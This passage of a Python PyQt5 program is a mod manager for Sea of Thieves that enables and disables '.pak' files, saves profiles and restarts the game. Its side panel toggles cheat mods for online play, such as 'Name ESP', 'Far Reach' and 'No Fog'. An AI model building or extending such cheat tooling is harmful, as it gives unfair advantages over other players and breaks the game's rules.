        act_layout = QHBoxLayout()
        self.btn_add = QPushButton('Add Custom Pak')
        self.btn_add.clicked.connect(self.add_custom_pak)
        self.btn_select = QPushButton('Select')
        self.btn_select.clicked.connect(self.toggle_select_mode)
        self.btn_market = QPushButton('Marketplace')
        self.btn_market.clicked.connect(self.show_marketplace)
        self.btn_profiles = QPushButton('Profiles')
        self.btn_profiles.clicked.connect(self.show_profiles)
        self.btn_settings = QPushButton('Settings')
        self.btn_settings.clicked.connect(self.open_settings)
        self.btn_logout = QPushButton('Logout')
        self.btn_logout.clicked.connect(self.logout)
        self.btn_reload = QPushButton('Quick Reload')
        self.btn_reload.clicked.connect(self.quick_reload)
        for w in [self.btn_add, self.btn_select, self.btn_market, self.btn_profiles, self.btn_settings, self.btn_logout, self.btn_reload]:
            act_layout.addWidget(w)
        left_panel.addLayout(act_layout)
        self.batch_bar = QWidget()
        bb = QHBoxLayout(self.batch_bar)
        self.btn_enable = QPushButton('Enable Selected')
        self.btn_disable = QPushButton('Disable Selected')
        self.btn_enable.clicked.connect(self.batch_enable)
        self.btn_disable.clicked.connect(self.batch_disable)
        bb.addWidget(self.btn_enable)
        bb.addWidget(self.btn_disable)
        self.btn_delete = QPushButton('Delete Selected')
        self.btn_delete.clicked.connect(self.batch_delete)
        bb.addWidget(self.btn_delete)
        self.batch_bar.setVisible(False)
        left_panel.addWidget(self.batch_bar)
        self.grid_w = QWidget()
        self.grid_w.setStyleSheet('background: transparent;')
        self.grid_layout = QGridLayout(self.grid_w)
        self.scroll = QScrollArea()
        self.scroll.setWidgetResizable(True)
        self.scroll.setWidget(self.grid_w)
        left_panel.addWidget(self.scroll)
        main_layout.addLayout(left_panel)
        self.create_side_panel()
        wrapper = QFrame()
        wrapper.setObjectName('sidePanel')
        fade = load_settings().get('side_fade', '#9a1ea8')
        wrapper.setStyleSheet(f'background: qlineargradient(spread:pad, x1:0, y1:1, x2:0, y2:0, stop:0 {fade}, stop:1 transparent);')
        wrapper.setLayout(QVBoxLayout())
        wrapper.layout().addWidget(self.side_panel)
        wrapper.setMaximumWidth(self.side_panel.width())
        main_layout.addWidget(wrapper)
        self.side_panel_wrapper = wrapper

    def show_notification(self, message, duration=2000):
        notif = QLabel(message, self)
        notif.setStyleSheet('background-color: #333333; color: white; padding: 8px; border-radius: 6px;')
        notif.adjustSize()
        box_w = notif.width()
        box_h = notif.height()
        start_x = self.width()
        end_x = self.width() - box_w - 10
        y = 20
        notif.setGeometry(start_x, y, box_w, box_h)
        notif.show()
        anim_in = QPropertyAnimation(notif, b'geometry', self)
        anim_in.setDuration(300)
        anim_in.setStartValue(QRect(start_x, y, box_w, box_h))
        anim_in.setEndValue(QRect(end_x, y, box_w, box_h))
        anim_in.setEasingCurve(QEasingCurve.OutCubic)
        pause = QPauseAnimation(duration)
        anim_out = QPropertyAnimation(notif, b'geometry', self)
        anim_out.setDuration(300)
        anim_out.setStartValue(QRect(end_x, y, box_w, box_h))
        anim_out.setEndValue(QRect(start_x, y, box_w, box_h))
        anim_out.setEasingCurve(QEasingCurve.InCubic)
        seq = QSequentialAnimationGroup(self)
        seq.addAnimation(anim_in)
        seq.addAnimation(pause)
        seq.addAnimation(anim_out)
        seq.start()
        seq.finished.connect(notif.deleteLater)

    def create_side_panel(self):
        self.side_panel = QWidget()
        self.side_panel.setFixedWidth(200)
        layout = QVBoxLayout(self.side_panel)
        items = [('No Fog', 'nofog_p90.pak'), ('Ladder Grab', 'laddergrab_p9999.pak'), ('Quick Reload', 'InstantXCancle_p9999999999.pak'), ('FOV', 'aaa_fovslider_p1000.pak'), ('Quickswap', 'superQS_p1000.pak'), ('TRPship', 'Shiptransparenttt_p9129.pak'), ('Name ESP', 'workingnames_p9999999999999.pak'), ('Instant Blackscreen', 'blackscreen_p9999.pak'), ('Always Day', 'alwaysday14_p200.pak'), ('Far Reach', 'farreach_p999999999.pak'), ('No Zoom', 'aaa_nozoom_p1000.pak')]
        for name, filename in items:
            cb = Switch(f'Enable {name}')
            cb.setProperty('pak_filename', filename)
            target = os.path.join(pak_directory, filename)
            cb.setChecked(os.path.exists(target))
            cb.toggled.connect(self.toggle_switch)
            layout.addWidget(cb)

    def load_pak_items(self):
        self.pak_items = []
        for cat in ['weapons', 'vanity', 'equipment']:
            for src, d in [('default', default_dirs[cat]), ('custom', custom_dirs[cat])]:
                if os.path.isdir(d):
                    for f in os.listdir(d):
                        if f.endswith('.pak'):
                            self.pak_items.append(PakItem(f, src, cat))

    def refresh_display(self):
        self.grid_w.setUpdatesEnabled(False)
        for i in reversed(range(self.grid_layout.count())):
            w = self.grid_layout.itemAt(i).widget()
            if w:
                w.setParent(None)
        query = self.search_bar.text().lower()
        r = c = 0
        for item in self.pak_items:
            if item.category!= self.current_category:
                continue
            if not self.source_filters.get(item.source, True):
                continue
            if query and query not in item.filename.lower():
                continue
            btn = QPushButton()
            btn.setToolTip(f'<b>{item.filename}</b><br>Source: {item.source}<br>Category: {item.category.capitalize()}')
            btn.setFocusPolicy(Qt.NoFocus)
            btn.setAutoDefault(False)
            btn.setDefault(False)
            btn.setCursor(Qt.PointingHandCursor)
            target = os.path.join(pak_directory, item.filename)
            if os.path.exists(target):
                btn.setStyleSheet('QPushButton { background-color: green; border: 1px solid #4C566A; border-radius: 5px; padding: 6px; }\nQPushButton:hover { background-color: #5E81AC; }')
            if not os.path.exists(item.thumbnail):
                btn.setIcon(QIcon(default_set_image))
                btn.setIconSize(QSize(80, 80))
            target = os.path.join(pak_directory, item.filename)
            if os.path.exists(target):
                btn.setStyleSheet('QPushButton { background-color: green; border: 1px solid #4C566A; border-radius: 5px; padding: 6px; }\nQPushButton:hover { background-color: #5E81AC; }')
            if os.path.exists(item.thumbnail):
                btn.setIcon(QIcon(item.thumbnail))
                btn.setIconSize(QSize(80, 80))
            btn.setFixedSize(100, 100)
            btn.setProperty('pak', item)
            btn.clicked.connect(lambda _, b=btn: self.on_pak_clicked(b))
            cell = QWidget()
            l = QVBoxLayout(cell)
            l.addWidget(btn)
            if self.selection_mode:
                ch = QCheckBox()
                ch.stateChanged.connect(lambda st, b=btn: self.on_pak_selected(b, st))
                l.addWidget(ch)
            self.grid_layout.addWidget(cell, r, c)
            c += 1
            if c >= 5:
                c = 0
                r += 1
        self.batch_bar.setVisible(self.selection_mode)
        self.grid_w.setUpdatesEnabled(True)
        count = sum((1 for item in self.pak_items if item.category == self.current_category and (not self.source_filters.get(item.source, True)) and (not (self.search_bar.text() and self.search_bar.text().lower() in item.filename.lower()))))

    def change_category(self, category):
        self.current_category = category
        self.refresh_display()

    def toggle_source_filter(self, src):
        self.source_filters[src] = not self.source_filters[src]
        self.refresh_display()

    def on_pak_clicked(self, btn):
        if self.selection_mode:
            return None
        pak = btn.property('pak')
        if pak:
            target = os.path.join(pak_directory, pak.filename)
            if os.path.exists(target):
                os.remove(target)
                btn.setStyleSheet('QPushButton { background-color: #4C566A; border: 1px solid #4C566A; border-radius: 5px; padding: 6px; }\nQPushButton:hover { background-color: #5E81AC; }')
                self.show_notification(f"Disabled {pak.filename}")
                self.plugin_manager.emit('on_pak_toggled', pak.filename, False)
            else:
                src_dir = default_dirs[pak.category] if pak.source == 'default' else custom_dirs[pak.category]
                shutil.copy(os.path.join(src_dir, pak.filename), target)
                btn.setStyleSheet('QPushButton { background-color: green; border: 1px solid #4C566A; border-radius: 5px; padding: 6px; }\nQPushButton:hover { background-color: #5E81AC; }')
                self.show_notification(f"Enabled {pak.filename}")
                self.plugin_manager.emit('on_pak_toggled', pak.filename, True)

    def toggle_select_mode(self):
        self.selection_mode = not self.selection_mode
        self.btn_select.setText('Cancel Select' if self.selection_mode else 'Select')
        self.selected_items.clear() if not self.selection_mode else None
        self.refresh_display()

    def on_pak_selected(self, btn, st):
        pak = btn.property('pak')
        if st == Qt.Checked:
            self.selected_items.add(pak)
        else:
            self.selected_items.discard(pak)

    def batch_enable(self):
        for pak in list(self.selected_items):
            tgt = os.path.join(pak_directory, pak.filename)
            if os.path.exists(tgt):
                continue
            sdir = default_dirs[pak.category] if pak.source == 'default' else custom_dirs[pak.category]
            shutil.copy(os.path.join(sdir, pak.filename), tgt)
        self.toggle_select_mode()

    def batch_disable(self):
        for pak in list(self.selected_items):
            tgt = os.path.join(pak_directory, pak.filename)
            if os.path.exists(tgt):
                os.remove(tgt)
        self.toggle_select_mode()
        self.refresh_display()

    def batch_delete(self):
        """Delete selected paks entirely, then refresh UI."""
        for pak in list(self.selected_items):
            tgt = os.path.join(pak_directory, pak.filename)
            os.remove(tgt) if os.path.exists(tgt) else None
            if pak.source == 'custom':
                p = os.path.join(custom_dirs[pak.category], pak.filename)
                if os.path.exists(p):
                    os.remove(p)
        self.selection_mode = False
        self.selected_items.clear()
        self.load_pak_items()
        self.refresh_display()

    def add_custom_pak(self):
        pak_path, _ = QFileDialog.getOpenFileName(self, 'Select Custom Pak', '', 'Pak Files (*.pak)')
        if pak_path:
            try:
                dest_pak = os.path.join(custom_dirs[self.current_category], os.path.basename(pak_path))
                shutil.copy(pak_path, dest_pak)
                img_path, _ = QFileDialog.getOpenFileName(self, 'Select Pak Thumbnail Image', '', 'Image Files (*.png *.jpg *.jpeg)')
                if img_path:
                    try:
                        dest_img = os.path.join(CUSTOM_PAK_IMAGES_DIR, os.path.basename(pak_path).replace('.pak', '.png'))
                        shutil.copy(img_path, dest_img)
                    except Exception as e:
                        QMessageBox.warning(self, 'Image Error', f'Failed to add custom image: {e}')
                self.load_pak_items()
                self.refresh_display()
            except Exception as e:
                QMessageBox.critical(self, 'Error', f'Failed to add custom pak: {e}')

    def open_settings(self):
        SettingsWindow(self).show()

    def logout(self):
        self.hide()
        self.login_window = LoginWindow()
        self.login_window.show()

    def show_marketplace(self):
        """Display the Pak Marketplace with only per‑item +/- toggles."""
        if hasattr(self, 'market_dialog') and self.market_dialog and self.market_dialog.isVisible():
            self.market_dialog.raise_()
            return None
        # Add marketplace implementation here
        self.market_dialog = QDialog(self)
        self.market_dialog.setWindowTitle('Pak Marketplace')
        self.market_dialog.setMinimumSize(600, 500)
        layout = QVBoxLayout(self.market_dialog)
        layout.addWidget(QLabel("Marketplace functionality not implemented yet"))
        self.market_dialog.exec_()

    def center_window(self):
        screen = QApplication.desktop().screenGeometry()
        size = self.geometry()
        self.move((screen.width() - size.width()) // 2, (screen.height() - size.height()) // 2)

    def add_pak_to_category(self, filename):
        category, ok = QInputDialog.getItem(self, 'Select Category', 'Category:', ['weapons', 'vanity', 'equipment'], 0, False)
        if not ok:
            return None
        try:
            src = os.path.join(PAK_MARKETPLACE_DIR, filename)
            dst = os.path.join(custom_dirs[category], filename)
            shutil.copy(src, dst)
            self.load_pak_items()
            self.refresh_display()
        except Exception as e:
            QMessageBox.critical(self, 'Error', f'Failed to add pak: {e}')

    def toggle_marketplace_item(self, filename):
        in_cats = [c for c in custom_dirs if os.path.exists(os.path.join(custom_dirs[c], filename))]
        if in_cats:
            cat, ok = QInputDialog.getItem(self, 'Remove From', 'Category:', in_cats, 0, False)
            if ok:
                os.remove(os.path.join(custom_dirs[cat], filename))
        self.load_pak_items()
        self.refresh_display()

    def toggle_switch(self, checked):
        sender = self.sender()
        pak_name = sender.text().replace('Enable ', '')
        fn = sender.property('pak_filename')
        pak_path = os.path.join(side_paks_directory, fn)
        target = os.path.join(pak_directory, fn)
        try:
            if checked:
                if os.path.exists(pak_path):
                    shutil.copy(pak_path, target)
            else:
                if os.path.exists(target):
                    os.remove(target)
            self.show_notification(f"{('Enabled' if checked else 'Disabled')} {pak_name}")
        except Exception as e:
            QMessageBox.critical(self, 'Error', str(e))

    def show_profiles(self):
        dlg = QDialog(self)
        dlg.setWindowTitle('Profiles Manager')
        dlg.resize(500, 400)
        layout = QVBoxLayout(dlg)
        
        list_widget = QListWidget(dlg)
        profiles = load_profiles()
        for name in profiles:
            list_widget.addItem(name)
        layout.addWidget(list_widget)
        
        btn_layout = QHBoxLayout()
        btn_load = QPushButton('Load')
        btn_delete = QPushButton('Delete')
        btn_new = QPushButton('New')
        btn_import = QPushButton('Import')
        btn_export = QPushButton('Export')
        for btn in [btn_load, btn_delete, btn_new, btn_import, btn_export]:
            btn_layout.addWidget(btn)
        layout.addLayout(btn_layout)

        def do_load():
            item = list_widget.currentItem()
            if item:
                self.load_profile(item.text())
            return None
        btn_load.clicked.connect(do_load)

        def do_delete():
            item = list_widget.currentItem()
            if item:
                profiles.pop(item.text(), None)
                save_profiles(profiles)
                list_widget.takeItem(list_widget.currentRow())
            return None
        btn_delete.clicked.connect(do_delete)

        def do_new():
            name, ok = QInputDialog.getText(self, 'New Profile', 'Enter profile name:')
            if ok and name.strip():
                self.save_profile(name.strip())
                list_widget.addItem(name.strip())
                return
        btn_new.clicked.connect(do_new)

        def do_export():
            item = list_widget.currentItem()
            if item:
                name = item.text()
                fname, _ = QFileDialog.getSaveFileName(self, 'Export Profile', name + '.json', 'JSON Files (*.json)')
                if fname:
                    with open(fname, 'w') as f:
                        json.dump({name: profiles[name]}, f, indent=2)
                return
        btn_export.clicked.connect(do_export)

        def do_import():
            fpath, _ = QFileDialog.getOpenFileName(self, 'Import Profiles', '', 'JSON Files (*.json)')
            if fpath:
                data = json.load(open(fpath))
                profiles.update(data)
                save_profiles(profiles)
                list_widget.clear()
                for n in profiles:
                    list_widget.addItem(n)
            return None
        btn_import.clicked.connect(do_import)
        dlg.exec_()

    def save_profile(self, name):
        profiles = load_profiles()
        enabled = [pak.filename for pak in self.pak_items if os.path.exists(os.path.join(pak_directory, pak.filename))]
        profiles[name] = enabled
        save_profiles(profiles)
        self.plugin_manager.emit('on_profile_saved', name, enabled)
        QMessageBox.information(self, 'Profile Saved', f'Profile \"{name}\" saved.')

    def load_profile(self, name):
        profiles = load_profiles()
        if name not in profiles:
            QMessageBox.warning(self, 'Error', 'Profile not found.')
            return None
        
        # Clear all currently enabled paks
        for pak in self.pak_items:
            target = os.path.join(pak_directory, pak.filename)
            if os.path.exists(target):
                os.remove(target)
        
        # Enable paks from profile
        enabled_paks = profiles[name]
        for pak_name in enabled_paks:
            for pak in self.pak_items:
                if pak.filename == pak_name:
                    src_dir = default_dirs[pak.category] if pak.source == 'default' else custom_dirs[pak.category]
                    shutil.copy(os.path.join(src_dir, pak.filename), os.path.join(pak_directory, pak.filename))
                    break
        
        self.refresh_display()
        self.plugin_manager.emit('on_profile_loaded', name, enabled_paks)
        QMessageBox.information(self, 'Profile Loaded', f'Profile "{name}" loaded.')

    def quick_reload(self):
        """Close and relaunch Sea of Thieves to apply pak changes."""
        from PyQt5.QtWidgets import QMessageBox
        import subprocess
        reply = QMessageBox.question(self, 'Quick Reload', 'This will close and reopen Sea of Thieves. Continue?', 
                                   QMessageBox.Yes | QMessageBox.No)
        if reply == QMessageBox.Yes:
            try:
                subprocess.call(['taskkill', '/f', '/im', 'SoTGame.exe'])
                try:
                    subprocess.Popen(['cmd', '/c', 'start', 'steam://rungameid/1172620'], shell=True)
                except Exception as e:
                    QMessageBox.warning(self, 'Error', f'Failed to launch game: {e}')
            except Exception as e:
                QMessageBox.warning(self, 'Error', f'Failed to close game: {e}')

    def toggle_side_panel(self):
        start = self.side_panel_wrapper.maximumWidth()
        end = 0 if start > 0 else self.side_panel.width()
        anim = QPropertyAnimation(self.side_panel_wrapper, b'maximumWidth', self)
        anim.setDuration(300)
        anim.setStartValue(start)
        anim.setEndValue(end)
        anim.setEasingCurve(QEasingCurve.InOutCubic)
        anim.start()
        self._side_anim = anim
import __main__
__main__.MainWindow = MainWindow
if __name__ == '__main__':
    app = QApplication(sys.argv)
    app.setStyleSheet(STYLESHEET)
    game_platform_choice_window = GamePlatformChoiceWindow()
    sys.exit(app.exec_())